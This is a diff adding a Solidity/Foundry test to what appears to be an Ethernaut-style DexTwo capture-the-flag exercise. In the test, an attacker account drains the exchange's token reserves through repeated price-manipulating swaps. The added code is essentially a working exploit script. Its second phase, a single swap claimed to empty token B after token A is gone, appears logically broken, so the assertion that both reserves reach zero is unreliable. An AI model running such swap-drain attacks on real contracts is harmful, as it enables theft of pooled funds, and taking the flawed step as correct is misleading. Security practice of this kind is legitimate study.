@@ -32,5 +32,64 @@ contract DexTwoTest is Test {
       
     }
 
-  
+  function test_drainBothTokens() public {
+        vm.startPrank(attacker);
+        
+        // Approve DexTwo to spend tokens
+        swappabletokenA.approve(address(dexTwo), type(uint256).max);
+        swappabletokenB.approve(address(dexTwo), type(uint256).max);
+
+        console.log("\nInitial state:");
+        logState();
+
+        // Phase 1: Drain Token A
+        console.log("\nPhase 1: Draining Token A...");
+        
+        dexTwo.swap(address(swappabletokenA), address(swappabletokenB), 10);
+        console.log("\nSwap 1:");
+        logState();
+
+        dexTwo.swap(address(swappabletokenB), address(swappabletokenA), 20);
+        console.log("\nSwap 2:");
+        logState();
+
+        dexTwo.swap(address(swappabletokenA), address(swappabletokenB), 24);
+        console.log("\nSwap 3:");
+        logState();
+
+        dexTwo.swap(address(swappabletokenB), address(swappabletokenA), 30);
+        console.log("\nSwap 4:");
+        logState();
+
+        dexTwo.swap(address(swappabletokenA), address(swappabletokenB), 41);
+        console.log("\nSwap 5:");
+        logState();
+
+        dexTwo.swap(address(swappabletokenB), address(swappabletokenA), 45);
+        console.log("\nToken A drained:");
+        logState();
+
+        // Phase 2: Drain Token B
+        console.log("\nPhase 2: Draining Token B...");
+        
+        // We can drain all remaining Token B using the same principle
+        dexTwo.swap(address(swappabletokenA), address(swappabletokenB), 45);
+        
+        console.log("\nFinal state:");
+        logState();
+
+        vm.stopPrank();
+
+        // Verify both tokens have been drained
+        assertEq(IERC20(address(swappabletokenA)).balanceOf(address(dexTwo)), 0, "DexTwo should have 0 Token A");
+        assertEq(IERC20(address(swappabletokenB)).balanceOf(address(dexTwo)), 0, "DexTwo should have 0 Token B");
+    }
+
+    function logState() internal view {
+        console.log("DexTwo Token A balance:", IERC20(address(swappabletokenA)).balanceOf(address(dexTwo)));
+        console.log("DexTwo Token B balance:", IERC20(address(swappabletokenB)).balanceOf(address(dexTwo)));
+        console.log("Attacker Token A balance:", IERC20(address(swappabletokenA)).balanceOf(attacker));
+        console.log("Attacker Token B balance:", IERC20(address(swappabletokenB)).balanceOf(attacker));
+        console.log("---");
+    }
 }
